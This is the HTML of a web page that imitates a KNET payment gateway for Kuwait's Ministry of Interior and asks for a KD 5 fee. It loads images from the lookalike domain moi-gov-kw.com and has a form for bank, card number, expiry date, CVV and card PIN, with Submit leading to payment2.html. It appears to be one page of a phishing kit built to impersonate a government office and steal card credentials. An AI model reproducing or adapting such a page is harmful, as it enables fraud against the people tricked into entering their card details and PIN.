<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>...</title>
    <!-- Google Fonts -->
    <link
      href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap"
      rel="stylesheet"
    />
    <!-- Tailwind -->
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <style>
      body {
        font-family: "Cairo", sans-serif;
      }
    </style>
  </head>
  <body class="bg-white">
    <main class="w-full md:w-[600px] mx-auto p-4">
      <img
        src="https://moi-gov-kw.com/banner.jpg"
        class="mx-auto rounded-es-xl rounded-se-xl"
      />

      <section
        class="mx-auto my-3 p-4 lg:p-8 shadow-lg rounded-xl border-2 border-sky-600"
      >
        <div>
          <img src="https://moi-gov-kw.com/download.jpeg" class="mx-auto" />
        </div>

        <div class="mb-3">
          <h2 class="text-sky-600 font-bold text-lg mb-3">
            Billing Information
          </h2>
          <div>
            <div class="flex items-center">
              <h4 class="w-2/5 text-sm text-sky-600 font-bold">Merchant:</h4>
              <p class="text-sm">Ministry of Interior</p>
            </div>
            <div class="flex items-center">
              <h4 class="w-2/5 text-sm text-sky-600 font-bold">Website:</h4>
              <p class="text-sm">https://www.moi.gov.kw</p>
            </div>
            <div class="flex items-center">
              <h4 class="w-2/5 text-sm text-sky-600 font-bold">Amount:</h4>
              <p class="text-sm">KD 5</p>
            </div>
          </div>
        </div>

        <div class="mb-3">
          <h2 class="text-sky-600 font-bold text-lg mb-3">Card Information</h2>
          <div>
            <div class="flex items-center mb-1">
              <label class="w-2/5 text-sm text-sky-600 font-bold"
                >Select Your Bank:</label
              >
              <div class="w-3/5">
                <select class="w-full border border-gray-700 text-sm">
                  <option>Select Your Bank</option>
                  <option>Al Ahli Bank of Kuwait [ABK]</option>
                  <option>National Bank of Kuwait [NBK]</option>
                  <option>Kuwait Finance House [KFH]</option>
                  <option>Burgan Bank</option>
                  <option>Gulf Bank</option>
                  <option>Commercial Bank of Kuwait</option>
                  <option>Ahli United Bank Kuwait</option>
                  <option>Boubyan Bank</option>
                  <option>Warba Bank</option>
                  <option>Industrial Bank of Kuwait</option>
                </select>
              </div>
            </div>
            <div class="flex items-center mb-1">
              <label class="w-2/5 text-sm text-sky-600 font-bold"
                >Card Number:</label
              >
              <div class="w-3/5 flex gap-1">
                <select class="w-1/3 border border-gray-700 text-sm">
                  <option>Prefix</option>
                  <option>123456</option>
                  <option>123456</option>
                  <option>123456</option>
                  <option>123456</option>
                  <option>123456</option>
                </select>

                <input
                  style="box-shadow: inset 0px 2px 7px -2px #000000b0"
                  type="text"
                  class="w-2/3 border border-sky-600 outline-0"
                />
              </div>
            </div>
            <div class="flex items-center mb-1">
              <label class="w-2/5 text-sm text-sky-600 font-bold"
                >Expiration Date:</label
              >
              <div class="w-3/5 flex gap-1">
                <select class="border border-gray-700 text-sm">
                  <option>MM</option>
                  <option>1</option>
                  <option>2</option>
                  <option>3</option>
                  <option>4</option>
                  <option>5</option>
                  <option>6</option>
                  <option>7</option>
                  <option>8</option>
                  <option>9</option>
                  <option>10</option>
                  <option>11</option>
                  <option>12</option>
                </select>
                <select class="border border-gray-700 text-sm">
                  <option>YYYY</option>
                  <option>2024</option>
                  <option>2025</option>
                  <option>2026</option>
                  <option>2027</option>
                  <option>2028</option>
                  <option>2029</option>
                  <option>2030</option>
                  <option>2031</option>
                  <option>2032</option>
                  <option>2033</option>
                  <option>2034</option>
                </select>
              </div>
            </div>
            <div class="flex items-center mb-1">
              <label class="w-2/5 text-sm text-sky-600 font-bold">PIN:</label>
              <div class="w-3/5">
                <input
                  style="box-shadow: inset 0px 2px 7px -2px #000000b0"
                  type="text"
                  class="w-full border border-sky-600 outline-0"
                />
              </div>
            </div>
            <div class="flex items-center mb-1">
              <label class="w-2/5 text-sm text-sky-600 font-bold">CVV:</label>
              <div class="w-3/5">
                <input
                  style="box-shadow: inset 0px 2px 7px -2px #000000b0"
                  type="text"
                  class="w-full border border-sky-600 outline-0"
                />
              </div>
            </div>
          </div>
        </div>

        <div class="flex items-center justify-center gap-2">
          <a
            href="payment2.html"
            class="bg-gray-200 text-gray-500 font-bold p-1 rounded border border-gray-300 text-center"
          >
            Submit
          </a>
          <button
            class="bg-gray-200 text-gray-500 font-bold p-1 rounded border border-gray-300"
          >
            Reset
          </button>
        </div>
      </section>

      <footer class="text-center mx-auto text-sm">
        <p>All Rights Reserved. Copyright 2024 Â©</p>
        <p class="text-sky-600 font-bold">
          The Shared Electronic Banking Services Company - KNET
        </p>
      </footer>
    </main>
  </body>
</html>
